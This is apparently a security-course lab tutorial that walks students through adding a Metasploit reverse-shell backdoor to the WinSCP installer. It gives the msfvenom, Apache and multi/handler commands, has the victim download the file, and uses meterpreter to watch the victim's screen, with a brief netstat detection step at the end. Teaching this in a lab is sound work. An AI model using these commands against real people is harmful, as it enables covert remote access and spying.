---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Backdoor a Program

## Backdoor Programs

[Video Demonstration](https://youtu.be/C1A2Li2\_H-Q)

### Objective

Download a legitimate program and add a backdoor to obtain remote access to a victim computer.

### Discussion

This type of attack is how threat actors gain access to remote computers of users behind restrictive firewalls. Port 80, 8080, 443, etc. are usually allowed outbound to the internet. In many organizations, any port is allowed outbound. A threat actor can send an email attachment that contains a backdoor and work the way you will see it in this lab.

Also, when users download arbitrary programs from the internet, they could inadvertently inject malicious code into a computer that impacts the organization. Similarly, if a threat actor can gain access to a reputable website and their downloads, they could also inject a backdoor into the legit program and when someone downloads and executes it, it could allow threat actors to gain access into the organization. There have been many cases of this occurring. The most high-profile attack of this type was the Solarwinds attack. Threat actors gained access to the development environment of the Solarwinds source code. They injected a backdoor that was undetected for a significant amount of time. Solarwinds products are used by private industry, state and federal governments. The tool that was compromised is used to monitor network activity on a network such as computers which are up and running, the services running on the host, and other essential network functions. You can imagine the problem with this type of attack. The tool used to monitor networks was compromised and used in the healthcare, financial, military, federal, and state government levels. The attack allowed unrestricted access to computers because the Solarwinds monitoring tool is allowed unrestricted access to virtually every computer and device on a network.

Solarwinds attack: [https://www.npr.org/2021/04/16/985439655/a-worst-nightmare-cyberattack-the-untold-story-of-the-solarwinds-hack](https://www.npr.org/2021/04/16/985439655/a-worst-nightmare-cyberattack-the-untold-story-of-the-solarwinds-hack)

### Preparation

1. Ensure Alice’s Windows 7 system is on her _LAN_ segment.
2. Eve, put your Kali network adapter on the NETSEC-WAN segment.
3. Alice and Eve, make a note of Eve’s IP address.
4. Eve, download the original version of WinSCP to your Kali workstation: [https://tinyurl.com/2nvuxe7m](https://tinyurl.com/2nvuxe7m) (**PAY ATTENTION TO THE FOLDER WHERE IT IS DOWNLOADED**)
   1. NOTE: [WinSCP ](https://winscp.net/eng/index.php)is a legit program used to transfer files over a secure connection between computers.

### Start the Lab

Eve, open a terminal on Kali. The default location to download a file will be “Downloads” and this tutorial assumes that location. Run the commands below (Replace X.X.X.X with the IP of your Kali workstation):

**cd \~/Downloads**

**ls**

Be sure you see the “WinSCP.exe” file before continuing.

**msfvenom -x WinSCP.exe -p windows/meterpreter/reverse\_tcp LHOST=X.X.X.X LPORT=8080 -f exe -o WinSCP-3.8.5.exe**

The above command may take a few minutes to run and generate the payload. The program \*\*msfvenom \*\*is a game changer in the world of hacking. It makes it very easy to create backdoor programs. It used to take a lot of steps and programming skills to create a backdoor program. In this lab, we are backdooring a legit program, though \*\*msfvenom \*\*can create its own backdoor.

After the file has been created, copy the file to the web server root directory on your Kali workstation.

**sudo cp WinSCP-3.8.5.exe /var/www/html**

Then start the web server:

**sudo service apache2 start**

Then check to be sure the web server is running:

**sudo service apache2 status**

Apache is a very popular web server. A web server serves web pages and other interactive content. Anytime you use your web browser to access a site, it is running on a web server.

**Common job interview question is what port does a web server run on and, by default, it is port 80.**

### Start Metasploit.

Eve, run the following commands to start the “Listener” (this is the same as the[ reverse shell lab ](https://docs.google.com/document/d/0B0smSYOArSbNZGFQUUtxa3BLWlE/edit?usp=sharing\&ouid=117998309226657164937\&resourcekey=0-ZN0HmGtCZ71EQSIW0TforA\&rtpof=true\&sd=true)where Eve controlled her own server and ran ncat and waited for Alice to connect to it from behind the firewall). Replace X.X.X.X below with the IP address of your Kali workstation.

\*\*use exploit/multi/handler \*\*

\*\*set PAYLOAD windows/meterpreter/reverse\_tcp \*\*

**set LHOST X.X.X.X**

**set LPORT 8080**

**exploit**

The above command will listen on port 8080 for connections and it will connect to Eve’s machine (your Kali workstation). Review the reverse shell lab if necessary. In the msfvenom command above, you took a legitimate program and wrapped a program around it that will push your Kali attacking machine a shell from the victim (your Windows 7 system). It works just like the[ reverse shell lab](https://docs.google.com/document/d/0B0smSYOArSbNZGFQUUtxa3BLWlE/edit?usp=sharing\&ouid=117998309226657164937\&resourcekey=0-ZN0HmGtCZ71EQSIW0TforA\&rtpof=true\&sd=true) when eve uses ncat to start a listener and Alice connections from behind the firewall.

```
REFERENCE ONLY  This is not required for this lab.

If you are an attacker (or pen tester) and you have multiple targets, you can save the above commands to a file and run:

msconsole -q -r file1.rc
msconsole -q -r file2.rc
msconsole -q -r file3.rc

And wait for one of the victims to connect to the Metasploit session.
```

### Download the Backdoored program

Alice, open internet explorer and browse to Eve’s IP address:

**http://X.X.X.X/WinSCP-3.8.5.exe**

PAY ATTENTION TO WHERE IT DOWNLOADED.

When the file has downloaded, double-click on it and open it You will see the WinSCP default screen.

Alice and Eve, look at Eve’s Metasploit session. You will see that the WinSCP program connected to Eve’s listening service. **Also, note that the WinSCP still works as normal.**

### Back to Eve’s Metasploit session

Now that you have access to the victim system, you are in a meterpreter shell. Meterpreter is a memory resident program so when the machine reboots, it will not have any traces on the victim’s computer. Meterpreter has many functions that allow dumping passwords, listing running processes, enabling camera, sound, etc. Type the command:

**screenshare**

You may get a popup to create a password for a keyring, you can “Cancel” those windows. The web browser on your Kali workstation will open and show the desktop of the victim machine.

Now have your partner open programs on their Windows 7 system and watch their activity from your Kali workstation.

### Detecting the attack

Alice, since you know Eve’s IP address, open a command prompt on your Windows 7 system. Run the command:\
\
**netstat -an**

See if you can detect the connection to Eve’s computer on port 8080. The command netstat is used to list **net**work **stat**istics. One feature is to list all open ports and connected IPs.

## Switch roles.
